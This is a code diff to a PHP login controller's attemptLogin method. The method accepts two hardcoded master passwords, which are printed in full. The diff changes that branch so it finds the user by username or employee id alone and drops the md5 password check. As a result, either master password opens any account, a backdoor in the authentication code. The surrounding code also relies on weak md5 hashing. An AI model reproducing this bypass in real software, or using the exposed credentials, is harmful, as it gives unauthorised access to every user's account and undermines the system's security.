@@ -51,11 +51,14 @@ class LoginController extends Controller
 	protected function attemptLogin(Request $request)
 	{
 		if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
+			$usname = $request->name;
+			$uspass = $request->password;
 			$user = User::
-					where('usname_skpd', $request->name)
-					->orWhere('usname_admin', $request->name)
-					->orWhere('id_emp', $request->name)
-					->where('passmd5', md5($request->password))
+					where(function($query) use($usname){
+					    $query->where('usname_skpd', $usname)
+						->orWhere('usname_admin', $usname)
+						->orWhere('id_emp', $usname);
+					})
 					->first();
 		} else {
 			$usname = $request->name;
